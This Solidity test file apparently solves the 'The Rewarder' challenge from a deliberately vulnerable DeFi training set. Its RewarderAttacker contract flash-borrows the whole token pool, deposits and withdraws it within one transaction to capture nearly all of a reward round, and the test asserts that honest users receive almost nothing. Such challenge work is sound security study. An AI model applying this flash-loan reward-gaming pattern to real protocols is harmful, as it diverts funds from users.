// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "../the-rewarder/AccountingToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    FlashLoanerPool flashLoanerPool;
    DamnValuableToken damnValuableToken;
    TheRewarderPool rewarderPool;
    
    uint256 tokensInPool;

    constructor(address flashLoanerPoolAddress, 
                address damnValuableTokenAddress,
                address rewarderPoolAddress,
                uint256 totalTokens) {
        tokensInPool = totalTokens;
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        damnValuableToken = DamnValuableToken(damnValuableTokenAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        damnValuableToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        damnValuableToken.transfer(address(flashLoanerPool), amount);
    }
    
    function attack() external {
        flashLoanerPool.flashLoan(tokensInPool);
    }
}

contract User {
    function deposit(DamnValuableToken damnValuableToken, TheRewarderPool rewarderPool, uint256 amount) public {
        damnValuableToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
    }
    
    function distributeRewards(TheRewarderPool rewarderPool) public {
        rewarderPool.distributeRewards();
    }
}

interface Vm {
    function deal(address who, uint256 amount) external;
    function warp(uint256) external;
    function expectRevert(bytes calldata) external;
}

contract RewarderTest is DSTest {
    AccountingToken accountingToken;
    DamnValuableToken damnValuableToken;
    RewardToken rewardToken;
    FlashLoanerPool flashLoanerPool;
    TheRewarderPool rewarderPool;
    User[] users;

    uint256 tokensInPool = 1000000 ether;

    Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        damnValuableToken = new DamnValuableToken();

        flashLoanerPool = new FlashLoanerPool(address(damnValuableToken));
        damnValuableToken.transfer(address(flashLoanerPool), tokensInPool);
        
        rewarderPool = new TheRewarderPool(address(damnValuableToken));
        accountingToken = rewarderPool.accToken();
        rewardToken = rewarderPool.rewardToken();
        
        users = [new User(), new User(), new User(), new User()];
        
        for (uint8 i = 0; i < users.length; i++) {
            uint256 amount = 100 ether;
            
            damnValuableToken.transfer(address(users[i]), amount);
            users[i].deposit(damnValuableToken, rewarderPool, amount);
        }
        
        emit log_uint(block.timestamp);
        vm.warp(block.timestamp + 5 days);
        
        for (uint8 i = 0; i < users.length; i++) {
            users[i].distributeRewards(rewarderPool);
            
            require(rewardToken.balanceOf(address(users[i])) == 25 ether);
        }
        
        require(rewardToken.totalSupply() == 100 ether);
        
        require(rewarderPool.roundNumber() == 2);
    }

    function testRewarder() public {
        emit log_uint(block.timestamp);
        vm.warp(block.timestamp + 6 days);
        RewarderAttacker attacker = new RewarderAttacker(address(flashLoanerPool), 
                                                         address(damnValuableToken), 
                                                         address(rewarderPool), 
                                                         tokensInPool);
        
        attacker.attack();

        // Only one round should have taken place
        require(rewarderPool.roundNumber() == 3);
        
        // Users should get negligible rewards
        for (uint8 i = 0; i < users.length; i++) {
            uint256 rewards = rewardToken.balanceOf(address(users[i]));
            uint256 delta = rewards - 25 ether;
            
            require(delta < ((1 ether) / 100));
        }
        
        // Rewards must be issued to the attacker account
        require(rewardToken.totalSupply() > 100 ether);

        // Attacker's reward should be really close to 100 tokens.
        require(100 ether - rewardToken.balanceOf(address(attacker)) < (1 ether / 10));
        
        // Attacker finishes with zero DVT tokens in balance
        require(damnValuableToken.balanceOf(address(attacker)) == 0);
        
    }
}
